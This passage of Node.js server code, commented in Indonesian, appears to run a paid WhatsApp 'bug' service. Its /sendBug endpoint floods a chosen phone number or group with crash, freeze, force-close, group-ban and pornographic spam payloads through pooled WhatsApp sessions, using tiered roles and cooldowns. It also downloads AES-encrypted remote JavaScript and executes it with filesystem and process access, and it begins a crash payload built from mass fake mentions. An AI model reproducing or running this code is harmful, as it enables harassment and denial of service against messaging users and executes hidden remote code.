  console.log(`[📱] Device login baru, override session untuk ${username}`);
}

// generate key baru & override
const key = generateKey();
activeKeys[key] = {
  username,
  created: Date.now(),
  expires: Date.now() + 10 * 60 * 1000,
};

recordKey({
  username,
  key,
  role: user.role || 'member',
  ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
  androidId,
});

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  if (!isGroupLink && !isGroupJid) {
    target = (target || "").replace(/\D/g, "");
  }

  console.log(`[📤] target=${target} | bug=${bug} | mode=${senderMode}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const role = user.role || "member";

  // ==========================================
  // LOGIC LIMIT GLOBAL SENDER HARIAN (BACKEND SECURE)
  // ==========================================
  if (senderMode === 'global') {
    const globalLimits = { vip: 4, owner: 6, staff: 8, petinggi: 10, king: 15 };
    const maxGlobal = globalLimits[role] || 0;

    if (maxGlobal === 0) {
      return res.json({ valid: false, message: "Akses Ditolak: Role Anda tidak memiliki akses ke Global Sender." });
    }

    const today = new Date().toISOString().split('T')[0]; // Format YYYY-MM-DD
    
    // Reset hitungan jika hari berganti
    if (user.dailyGlobalDate !== today) {
      user.dailyGlobalUsed = 0;
      user.dailyGlobalDate = today;
    }

    // Cek apakah limit sudah habis
    if ((user.dailyGlobalUsed || 0) >= maxGlobal) {
      return res.json({ 
        valid: false, 
        message: `Limit harian Global Sender (${maxGlobal}x) sudah habis! Gunakan Private Sender atau tunggu reset besok.` 
      });
    }

    // Kurangi limit & simpan langsung ke database
    user.dailyGlobalUsed = (user.dailyGlobalUsed || 0) + 1;
    saveDatabase(db);
  }
  // ==========================================

  const roleCooldowns = { member: 250, reseller: 290, admin: 60, vip: 10, owner: 1, staff: 1, petinggi: 1, king: 0 };
  const cooldownSeconds = roleCooldowns[role] ?? 60;

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true, sended: false,
      cooldown: true, wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);

  res.json({ valid: true, sended: true, cooldown: false, role });

  setImmediate(async () => {
    saveUserLog(user.username, "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Mode: ${senderMode} | Role: ${role}`
    );

    let sock = null;

    if (senderMode === 'global') {
      const entries = Object.entries(activeConnections);
      if (entries.length === 0) {
        console.warn(`[❌] Global: tidak ada koneksi aktif.`);
        return;
      }
      sock = entries[Math.floor(Math.random() * entries.length)][1];
      console.log(`[🌍] Global sender. Total aktif: ${entries.length}`);

    } else if (user.role === 'vip') {
      let pool = [];
      const vipPath = path.join(__dirname, 'vip');
      const userPath = path.join(__dirname, 'permenmd', user.username);
      if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
      if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
      if (pool.length === 0) {
        console.warn(`[❌] VIP: tidak ada sock.`); return;
      }
      sock = pool[Math.floor(Math.random() * pool.length)];
      console.log(`[👑] VIP pool. Total: ${pool.length}`);

    } else {
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌] Private: tidak ada sock untuk ${user.username}.`); return;
      }
      console.log(`[🔒] Private: ${user.username}`);
    }

    const attemptSend = async (sock, retry = false) => {
      let sessionName = null;
      try {
        for (const [k, v] of Object.entries(activeConnections)) {
          if (v === sock) { sessionName = k; break; }
        }

        let targetJid = "";

        if (isGroupLink) {
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[🔗] Invite: ${inviteCode}`);
          let groupInfo;
          try { groupInfo = await sock.groupGetInviteInfo(inviteCode); }
          catch (e) { throw new Error("Invite group invalid / expired"); }
          targetJid = groupInfo.id;
          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[✅] Join group: ${targetJid}`);
          } catch { console.log(`[⚠️] Already joined`); }

        } else if (isGroupJid) {
          targetJid = target;
        } else {
          targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";
        }

        console.log(`[🎯] JID: ${targetJid}`);

        switch (bug) {
          case "buldo":
            for (let i = 0; i < 50; i++) {
            await delayPajak(sock, targetJid);
            await sleep(500);
            }
            break;
          case "delay":
            for (let i = 0; i < 500; i++) {
             await DelayVisible(sock, targetJid);
             await sleep(250);
             }
            break;
          case "forclose":
            for (let i = 0; i < 100; i++) {
             await FconeMsgNew(sock, targetJid);
             await sleep(3000);
            }
            break;
          case "crash_ui":
            for (let i = 0; i < 100; i++) {
            await crashsystemuii(sock, targetJid);
            await sleep(500);
            }
            break;
          case "fc_click":
            for (let i = 0; i < 100; i++) {
            await bcForcee(sock, targetJid);
            await sleep(500);
            }
            break;
          case "fc_ios":
            for (let i = 0; i < 50; i++) {
            await PahinaCrashios(sock,targetJid);
            await ForcloseIos(sock, targetJid);
            await sleep(1000);
            }
            break;
          case "crashclick":
            for (let i = 0; i < 500; i++) {
             await CrashAndroidProto(sock, targetJid);
             await sleep(500);
             } 
            break;
          case "freezexdelay":
            for (let i = 0; i < 500; i++) {
             await Assalamualaikum(sock, targetJid);
             await delayPajak(sock, targetJid);
             await sleep(1000);
          }
            break;
          case "blankone":
            for (let i = 0; i < 1; i++) {
            await nomercystuckXFC(sock, targetJid); 
            }
            break;
          case "comboxxx":
            for (let i = 0; i < 150; i++) {
            await CrashSystemUi(sock, targetJid);
            await CrashSystemUi(sock, targetJid);
            await sleep(500);
            }
            break;
         case "spammer":
            for (let i = 0; i < 100; i++) {
            await spambokep(sock, targetJid);
            await sleep(500);
            }
            break;          
          case "ios":
            for (let i = 0; i < 100; i++) {
            await harddelayios(sock, targetJid);
            await sleep(500);
            }
            break;
          case "delay_group":
            for (let i = 0; i < 100; i++) { 
            await ZetTempurGb(sock, targetJid);
            await sleep(500);
            }
            break;
          case "fc_group":
            for (let i = 0; i < 10; i++) { 
            await crasbhX(sock, targetJid);
            await sleep(500);
            }
            break;  
          case "blank_group":
            for (let i = 0; i < 50; i++) {
              await blankGrouo(sock, target);
            }
            break;
          case "combo_group":
            for (let i = 0; i < 150; i++) {
              await BlankFreezeChatGroup(sock, targetJid);
              await begalGb(sock, targetJid);
              await bcForcee(sock, targetJid, false);
              await sleep(500);
              }
            break;
         case "ban_group":
            for (let i = 0; i < 100; i++) {
              await groupBan(sock, targetJid);
              }
            break;
          case "xfcui":
            for (let i = 0; i < 60; i++) await lockMessages(sock, targetJid);
            break;
          case "exec":
            for (let i = 0; i < 100; i++) { await exeTrash(sock, targetJid); await sleep(1000); }
            break;
          default:
            console.warn(`[⚠️] Bug '${bug}' tidak dikenal`);
        }

        console.log(`[✅] '${bug}' terkirim ke ${targetJid}`);
        return true;

      } catch (err) {
        console.warn(`[⚠️] ${err.message}`);
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
          console.log(`[🗑️] Session ${sessionName} dihapus`);
        }
        if (!retry) {
          if (user.role === 'vip') {
            let pool = [];
            const vipPath = path.join(__dirname, 'vip');
            const userPath = path.join(__dirname, 'permenmd', user.username);
            if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
            if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
            if (pool.length > 0) {
              return await attemptSend(pool[Math.floor(Math.random() * pool.length)], true);
            }
          } else {
            const retrySock = await checkActiveSessionInFolder(user.username);
            if (retrySock) return await attemptSend(retrySock, true);
          }
        }
        console.warn(`[❌] Gagal kirim '${bug}' ke ${target}`);
        return false;
      }
    };

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

app.get("/getActiveSenders", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, senders: [] });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, senders: [] });

  if (!['staff', 'petinggi', 'owner', 'vip', 'king'].includes(user.role)) {
    return res.json({ valid: false, senders: [] });
  }

  const senders = Object.keys(activeConnections);
  res.json({ valid: true, senders });
});

app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'permenmd';
  let privateCount = 0;
  let globalCount = 0;

  try {
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];

  if (user.role === 'vip') {
    console.log(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);

    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith(".json"));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    const userPath = path.join('permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }

  } else {
    console.log(`[${user.username}] Request mySender (Member Mode)`);
    conns = getActiveCredsInFolder(user.username);
  }

  return res.json({
    valid: true,
    connections: conns
  });
});

const connectVipSessions = async () => {
  const vipPath = path.join(__dirname, 'vip');
  if (!fs.existsSync(vipPath)) {
    console.log(`[👑] Folder vip/ tidak ditemukan, skip.`);
    return;
  }

  const sessions = fs.readdirSync(vipPath).filter(name =>
    fs.statSync(path.join(vipPath, name)).isDirectory()
  );

  console.log(`[👑] VIP sessions ditemukan: ${sessions.length}`);

  await Promise.all(
    sessions.map(sessionName => {
      if (activeConnections[sessionName]) {
        console.log(`[⏭️] VIP ${sessionName} sudah aktif, skip`);
        return Promise.resolve();
      }
      return connectSession(vipPath, sessionName);
    })
  );

  console.log(`[👑] Semua VIP session selesai diproses.`);
};
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("permenmd", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "DANZNIEH")
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})


/// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "reseller1", "owner", "staff", "petinggi", "king"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${keyInfo.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (["reseller", "reseller1"].includes(creator.role) && parseInt(day) > 30) {
    console.log(`[❌ CREATE] ${creator.username} mencoba buat akun lebih dari 30 hari.`);
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log(`[❌ CREATE] ${newUser} sudah digunakan oleh ${creator.username}.`);
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
    pairId: genPairId(),
  };

  db.push(newAccount);
  saveDatabase(db);
    
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  sendToGroups(`✅ Akun Baru Dibuat\nUsername: ${newUser}\nDurasi: ${day} hari\nRole: member\nDibuat Oleh: ${creator.username}`);

  return res.json({ valid: true, created: true, user: newAccount });
});

// ===== Delete User =====
app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const executor = db.find(u => u.username === keyInfo.username);

  if (!executor || !["owner", "staff", "petinggi", "king"].includes(executor.role)) {
    console.log(`[❌ DELETE] ${keyInfo.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized to delete users." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log(`[❌ DELETE] ${username} tidak ditemukan oleh ${executor.username}.`);
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const roleHierarchy = { "owner": 1, "staff": 2, "petinggi": 3, "king": 4 };
  const executorLevel = roleHierarchy[executor.role];
  const targetLevel = roleHierarchy[targetUser.role];

  if (targetLevel !== undefined && targetLevel >= executorLevel) {
    console.log(`[❌ DELETE] ${executor.username} (${executor.role}) mencoba hapus ${username} (${targetUser.role}).`);
    return res.json({ valid: true, authorized: false, message: "You cannot delete this user." });
  }

  const index = db.findIndex(u => u.username === username);
  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
        
  const logLine = `${executor.username} Deleted ${username}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  sendToGroups(`🗑️ Akun Dihapus\nUsername: ${deletedUser.username}\nRole: ${deletedUser.role || "member"}\nDihapus Oleh: ${executor.username}`);

  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ===== Show All Users =====
app.get("/listUsers", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || !["owner", "staff", "petinggi", "king"].includes(admin.role)) {
    console.log(`[❌ LIST] ${keyInfo.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized to view users." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  console.log(`[✅ LIST] ${admin.username} melihat daftar akun. Total: ${users.length}`);

  return res.json({ valid: true, authorized: true, users });
});

// ===== Add User With Role =====
app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["owner", "staff", "petinggi", "king"].includes(creator.role)) {
    console.log(`[❌ USERADD] ${keyInfo.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized to add user with role." });
  }

  const allowedRolesByCreator = {
    king: ["vip", "member", "reseller", "owner", "staff", "petinggi"],
    petinggi: ["vip", "member", "reseller", "owner", "staff"],
    staff: ["vip", "member", "reseller", "owner"],
    owner: ["vip", "member", "reseller"],
  };

  const targetRole = role || "member";
  const allowedRoles = allowedRolesByCreator[creator.role] || [];

  if (!allowedRoles.includes(targetRole)) {
    console.log(`[❌ USERADD] ${creator.username} (${creator.role}) mencoba buat role ${targetRole}.`);
    return res.json({ valid: true, authorized: false, created: false, message: `You cannot assign role '${targetRole}'.` });
  }

  if (db.find(u => u.username === username)) {
    console.log(`[❌ USERADD] ${username} sudah digunakan oleh ${creator.username}.`);
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
    pairId: genPairId(),
  };

  db.push(newUser);
  saveDatabase(db);
    
  const logLine = `${creator.username} Created ${username} Role ${targetRole} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  sendToGroups(`✅ Akun Baru Dibuat\nUsername: ${username}\nDurasi: ${day} hari\nRole: ${targetRole}\nDibuat Oleh: ${creator.username}`);

  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

// ===== Edit User Expired Date =====
app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "reseller1", "owner", "staff", "petinggi", "king"].includes(editor.role)) {
    console.log(`[❌ EDIT] ${keyInfo.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (["reseller", "reseller1"].includes(editor.role) && parseInt(addDays) > 30) {
    console.log(`[❌ EDIT] ${editor.username} mencoba tambah lebih dari 30 hari.`);
    return res.json({ valid: true, authorized: false, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log(`[❌ EDIT] ${username} tidak ditemukan oleh ${editor.username}.`);
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  if (["reseller", "reseller1"].includes(editor.role) && targetUser.role !== "member") {
    console.log(`[❌ EDIT] ${editor.username} mencoba edit ${username} (${targetUser.role}).`);
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const roleHierarchy = { "owner": 1, "staff": 2, "petinggi": 3, "king": 4 };
  const editorLevel = roleHierarchy[editor.role];
  const targetLevel = roleHierarchy[targetUser.role];

  if (targetLevel !== undefined && targetLevel >= editorLevel) {
    console.log(`[❌ EDIT] ${editor.username} (${editor.role}) mencoba edit ${username} (${targetUser.role}).`);
    return res.json({ valid: true, edited: false, message: "You cannot edit this user." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${username} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  sendToGroups(`🛠️ Akun Diedit\nUsername: ${username}\nRole: ${targetUser.role || "member"}\nDurasi Ditambah: +${addDays} hari\nDiedit Oleh: ${editor.username}`);

  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// // ===== Get Log =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid key." });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || !["owner", "staff", "petinggi", "king"].includes(user.role)) {
    fs.appendFileSync('logUser.txt', `${keyInfo.username || "Unknown"} Tried to access log (Denied)\n`);
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    
    fs.appendFileSync('logUser.txt', `${user.username} Accessed log\n`);
    
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    fs.appendFileSync('logUser.txt', `${user.username} Tried to access log but file error: ${err.message}\n`);
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa; // TARO FUNC BUG AMPAS LO DISINI TTOLO

async function groupBan(sock, target) {
  if (!target.endsWith("@g.us")) throw "@g.us server required";
  try {
    await sock.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add")
  } catch (e) {
    throw e
  }
}

async function lyoxcdelay(target) {
  const generateFakeJid = () =>
    `1${Math.floor(Math.random() * 500000000)}@s.whatsapp.net`;

  const mentions = [
    "0@s.whatsapp.net",
    ...Array.from({ length: 1900 }, generateFakeJid),
  ];

  const mediaDatamrb = [
    {
      ID: "68BD677B",
      uri: "t62.43144-24/10000000_1407285833860834_2249780575933148603_n.enc?ccb=11-4&oh",
      buffer: "01_Q5Aa2AFffQpqWVK7GvldUiQQNd4Li_6BbUMZ3yHwZ55g5SuVKA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "o+hchsgN0ZtdSp8iBlD1Yb/kx9Mkrer8km3pw5azkj0=",
      mkey: "C+7Uy3QyEAHwMpIR7CGaKEhpZ3KYFS67TcYxcNbm73EXo=",
    },
    {
      ID: "68BD469B",
      uri: "t62.43144-24/10000000_2553936021621845_4020476590210043024_n.enc?ccb=11-4&oh",
      buffer: "01_Q5Aa2AHPt6cTL57bihyVMMppUvQiXg-m7Oog3TAebzRVWsCNEw&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "2cGzUZDAYCZq7QbAoiWSI1h5Z0WIje7VK1IiUgqu/+Y=",
      mkey: "1EvzGhM2IL78wiXyfpRrcr8o0ws/hTjtghBQUF+v3wI=",
    },
  ];

  const mediaData2mrb = [
    {
      ID: "69680D38",
      uri: "t62.43144-24/10000000_790307790709311_669779370012050552_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa3QGnIg1qMpL5Isc7LmIdU1IpoFsCqXialsd2OW2w0QQyUw&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "7ovcifxdIivWXIJgLvrRtPfs+pPXen7hoXtnoFKdP4s=",
      mkey: "Wql96TBHCa44YVS6eAlHGI6aYIYg6yc0kuOr0Y9WvtI=",
    },
    {
      ID: "69680D38",
      uri: "t62.43144-24/10000000_1534257120961824_1506742782412655205_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa3QEE7wUPnOULMZhlwnOw_bhHK6Gn7YI0hKpVm3yvw5dGMw&oe",
      sid: "5e03e0",
      SHA256: "I2ky6mhJmsFYmA+XRBoiaiTeYwnXGQAVXym+P/9YN6Y=",
      ENCSHA256: "HyfU2MhgxBQFFIohXT68RNZa0MAZRxDYB4X1c3I7JQY=",
      mkey: "Q5V7iUFs67ewh1qOOkqwQ9avc3u7qXAhyh2fIgVITCU=",
    },
    {
      ID: "696C0CE0",
      uri: "t62.43144-24/10000000_1897784937438799_7647459696855315586_n.enc?ccb=11-4&oh",
      buffer: "01_Q5Aa3QGNjK1V4UGLF19HxU16vRNPFJQjy64pYSFbsuEm6bySdw&oe",
      sid: "5e03e0",
      SHA256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
      ENCSHA256: "RA4VN83TrKamnTjEolURSU7+2UUDY28EFBBQvFNh7e4=",
      mkey: "dTMN5/4/mFir4PcfgezcrIXqigJ8pl/COUQMxUsTaac=",
    },
  ];

  const extendedMsg = {
    extendedTextMessage: {
      text: "$$$$$",
      locationMessage: {
        degressLatitude: 617267,
        degressLongitude: -6172677,
        isLive: true,
        accuracyInMetters: 100,
        jpegThumbnail: null,
      },
      contextInfo: {
        forwardingScore: 9471,
        isForwarded: true,
        mentionedJid: mentions,
        participant: target,
        stanzaId: target,
        entryPointConversionSource: "notification",
        remoteJid: target,
      },
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 3,
      },
    },
    mediaData: [...mediaDatamrb, ...mediaData2mrb],
  };

  const payload = {
    groupStatusMessageV2: {
      message: extendedMsg,
    },
  };

  const options = {
